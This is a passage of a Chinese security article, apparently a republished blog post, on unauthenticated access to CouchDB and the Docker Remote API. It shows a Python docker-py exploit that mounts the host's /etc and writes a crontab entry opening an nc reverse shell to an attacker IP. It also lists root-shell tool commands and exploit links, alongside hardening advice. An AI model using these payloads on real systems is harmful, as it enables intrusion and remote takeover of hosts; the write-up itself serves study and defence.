curl -XDELETE "$server/_config/query_servers/cmd"</code></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4828125" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/30_6gNQzbID6ECtBZ3nnsQD5Fiam7z9Rg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUU0xEOZYpYR2UNLaUPia53ebdicN6gNQzbID6ECtBZ3nnsQD5Fiam7z9Rg/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">3. 漏洞修复<br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>1、指定CouchDB绑定的IP</em>&nbsp;（需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到&nbsp;<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">bind_address = 0.0.0.0</code>，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>2、设置访问密码</em>&nbsp;（需要重启CouchDB才能生效） 在&nbsp;<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">/etc/couchdb/local.ini</code>中找到<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">[admins]</code>字段配置密码。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x09 Docker未授权访问</h2><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">1. 基础介绍</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问&nbsp;http://host:2375/containers/json&nbsp;会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">2. 测试环境配置</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">先关闭docker，然后开启：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">sudo service docker stop
sudo docker daemon &nbsp;-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">参考API规范进行渗透：https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">操作Docker API可以使用python dockert api 完成。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">pip install docker-py</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">API使用参考：https://docker-py.readthedocs.io/en/stable/api/##client-api</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">3. 漏洞复现</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.1 From:phith0n</strong><br  />利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' &gt;&gt; /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">写入crontab文件，成功反弹shell：</p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.2294757665677547" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/31_dYQoPpeibibDY0DkGmJjibnhX35MuA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUGtJyeDLWv3GvQVDk9TqlQzlTIAOdYQoPpeibibDY0DkGmJjibnhX35MuA/640?wx_fmt=png'" data-type="png" data-w="2022" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.2 python脚本</strong><br  />https://github.com/Tycx2ry/docker_api_vul<br  /></p><ul style="" class=" list-paddingleft-2"><li><p>安装类库<br  />pip install -r requirements.txt</p></li><li><p>查看运行的容器<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375</p></li><li><p>查看所有的容器<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a</p></li><li><p>查看所有镜像<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l</p></li><li><p>查看端口映射<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L</p></li><li><p>写计划任务（centos,redhat等,加-u参数用于ubuntu等）<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</p></li><li><p>写sshkey(自行修改脚本的中公钥)<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k</p></li><li><p>在容器中执行命令<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e&nbsp;<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">"id"</code>&nbsp;-I 容器id</p></li><li><p>删除容器<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id</p></li><li><p>修改client api版本<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22</p></li><li><p>查看服务端api版本<br  />python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V</p></li></ul><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.3 其他的一些exp</strong><br  />https://github.com/netxfly/docker-remote-api-exp<br  />https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py<br  />https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">4. 防护策略</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>1.修改 Docker Remote API 服务默认参数。</em>注意：该操作需要重启 Docker 服务才能生效。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>2.修改 Docker 的启动参数：</em><br  />定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1<br  />或将默认端口 2375 改为自定义端口<br  />为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>3.注意：该操作需要重启 Docker 服务才能生效。</em><br  />修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>4.注意：该操作需要重启 Docker 服务才能生效。</em><br  />设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x10 未完待续</h2><ul style="" class=" list-paddingleft-2"><li><p>关注最新漏洞情况，选择性的进行修复</p></li><li><p>梳理内部开放服务，了解哪些对外开放能内网访问的绝不开放公网</p></li><li><p>开放公网的服务必须做好访问控制</p></li><li><p>避免弱密码；避免弱密码；避免弱密码</p></li></ul><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">http://www.00theway.org/2017/03/27/redis_exp/<br  />https://www.secpulse.com/archives/61101.html<br  />https://xz.aliyun.com/t/84<br  />https://www.secpulse.com/archives/61046.html<br  />https://paper.seebug.org/409/<br  />https://www.cnblogs.com/kongzhongqijing/p/6867960.html<br  />https://b1ngz.github.io/jenkins-anonymous-configure-privilege-expoit/<br  />http://www.mottoin.com/92742.html</p><p style="text-align: left;"><strong style="font-size:12px;line-height:32px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);letter-spacing: 1.5px;color: rgb(178, 178, 178);font family: Avenir, SimSun !important;"><strong style="color: rgb(51, 51, 51);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;font-size:15px;line-height:35px;;"><span style="color: rgb(136, 136, 136);font family: &quot;Lucida Grande&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, STHeiti, &quot;Microsoft YaHei&quot;, &quot;WenQuanYi Zen Hei&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Noto Sans CJK SC&quot;, &quot;Source Han Sans CN&quot;, SimSun, sans-serif;white-space: pre-wrap;"><strong style="color: rgb(255, 104, 39);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;"><img class="" data-backh="54" data-backw="501" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" data-ratio="0.109375" data-type="png" data-w="640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/32_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;color: rgb(51, 51, 51);font-size:17px;line-height:37px;;text-align: justify;visibility: visible !important;width: 639.6px !important;"  /></strong></span></strong></strong></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">作者：evi1ox</span></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">来源：先知社区</span></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/33_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p>
                <div class="msg_source_url"><a href="https://xz.aliyun.com/t/2320">阅读原文</a></div></div>
</div>
</body>
</html>